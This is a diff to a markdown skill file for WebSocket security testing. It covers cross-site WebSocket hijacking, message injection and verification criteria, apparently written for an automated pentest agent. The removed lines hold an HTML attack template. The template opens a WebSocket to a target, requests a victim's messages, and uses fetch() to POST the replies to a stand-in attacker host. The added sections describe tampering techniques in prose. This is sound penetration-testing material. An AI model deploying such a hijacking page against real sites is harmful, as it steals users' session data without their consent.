@@ -1,4 +1,4 @@
----
+﻿---
 name: websocket-attacks
 description: "WebSocket security testing including cross-site WebSocket hijacking, message injection, and protocol abuse"
 category: specialized
@@ -77,22 +77,6 @@ The WebSocket protocol does not enforce same-origin policy at the browser level.
 5. **Test with victim's cookies** — if auth is cookie-based, the malicious page inherits cookies
 
 ### Malicious Page Template
-```html
-<script>
-var ws = new WebSocket('wss://target.example.com/ws');
-ws.onopen = function() {
-    // Send commands to exfiltrate data
-    ws.send(JSON.stringify({action: 'getMessages', userId: 'victim'}));
-};
-ws.onmessage = function(e) {
-    // Exfiltrate received data to attacker server
-    fetch('https://attacker.example/collect', {
-        method: 'POST',
-        body: e.data
-    });
-};
-</script>
-```
 
 ### Origin Validation Checks
 - Does server send `Access-Control-Allow-Origin` on the 101 response?
@@ -302,3 +286,24 @@ Every finding must be backed by concrete evidence:
 - [ ] Auth bypass confirmed by receiving protected data without credentials
 - [ ] Rate limits measured with actual message timing data
 - [ ] All findings reproduce consistently across multiple attempts
+
+## Trigger Conditions
+
+Activate when the target exposes WebSocket endpoints (`ws://`/`wss://`) — chat, notifications, live feeds, collaborative editing, or `/socket.io`, `/signalr`, `/graphql` subscriptions — especially when WS URLs or Upgrade headers appear in JS bundles or API responses. Trigger for real-time authz/session concerns and message-injection surfaces. Do not trigger on REST-only APIs, SSE, or long-polling; if the WS handshake consistently fails (IP/rate blocking), pause rather than hammer.
+
+## Detection Approach
+
+First discover WS endpoints via page source, bundle analysis, and DevTools (look for `101 Switching Protocols`). Capture the full Upgrade handshake and identify the auth mechanism (cookie/Bearer/query) and whether Origin is validated. For CSWSH, test whether the server accepts a connection from an attacker-controlled origin — if it does and auth is cookie-based, the victim's session is hijackable. For message injection/authorization, establish a legitimate connection, learn the message schema, then tamper with `userId`/`role`/`recipientId` and observe server-enforced vs client-only validation. Test auth at handshake vs per-message, and horizontal/vertical escalation via message params. For input validation, send oversized/malformed/injection-laden frames. Confirm every finding with the actual handshake and observed state change — never assume from schema alone.
+
+## Pitfalls
+
+- Claiming CSWSH without testing from a real external origin (not just header inspection).
+- Assuming message injection worked without verifying server-side state change.
+- Reporting rate-limiting issues without measuring actual thresholds.
+- Claiming auth bypass without demonstrating the full handshake sequence.
+- Confusing SSE/long-polling with true WebSocket.
+- Ignoring whether auth is checked per-message or only at handshake (lazy checks are the gap).
+
+## Verification & Impact
+
+CONFIRMED when evidence shows: a successful 101 from an external origin (CSWSH), receipt of protected data without credentials, a modified message that changed application state, or connection persistence with invalid auth. SUSPECTED when the handshake looks weak but cross-origin/state impact isn't reproduced — record as candidate. Document impact by capability (session hijack, cross-user data access, privilege escalation, DoS via flood) and severity (CSWSH + cookie auth = Critical). Capture the WS URL, handshake headers, sent/received frames, and close frames via `recordEvidence`.
